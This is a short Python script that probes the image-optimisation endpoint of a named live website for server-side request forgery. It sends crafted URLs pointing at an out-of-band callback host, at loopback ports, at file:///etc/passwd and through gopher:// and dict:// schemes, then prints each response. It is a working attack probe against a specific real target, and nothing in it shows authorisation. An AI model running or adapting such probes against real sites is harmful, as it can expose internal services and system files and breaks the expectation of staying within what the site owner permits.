import requests, urllib.parse, sys
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
H = "oobea7b134d9774.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
T = "https://www.infinitycapital.bh"
enc = lambda s: urllib.parse.quote(s, safe="")

tests = [
    ("ssrf-oob-http", "http://" + H + "/ssrf-real", 640),
    ("ssrf-oob-dnsonly", "http://" + H + "/x.png", 1080),
    ("legit-ctfassets", "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg", 1080),
    ("internal-loopback", "http://127.0.0.1:3000/", 64),
    ("internal-loopback-80", "http://127.0.0.1/", 64),
    ("scheme-file", "file:///etc/passwd", 64),
    ("gopher", "gopher://127.0.0.1:25/_x", 64),
    ("dict", "dict://127.0.0.1:11211/", 64),
]
s = requests.Session()
s.headers.update({"User-Agent": UA, "Accept": "image/avif,image/webp,image/*,*/*;q=0.8"})
for name, u, w in tests:
    url = T + "/_next/image?url=" + enc(u) + "&w=%d&q=75" % w
    try:
        r = s.get(url, timeout=30, allow_redirects=False)
        body = r.content[:120]
        print("%-20s %-3d %-8d %-28s %r" % (name, r.status_code, len(r.content), r.headers.get("content-type","")[:28], body[:80]))
    except Exception as e:
        print("%-20s ERR %s" % (name, e))
# control: what the oob host itself returns when asked directly
try:
    r = requests.get("http://" + H + "/direct-self-test", timeout=15)
    print("CONTROL direct oob fetch:", r.status_code, len(r.content))
except Exception as e:
    print("CONTROL direct oob fetch ERR", e)
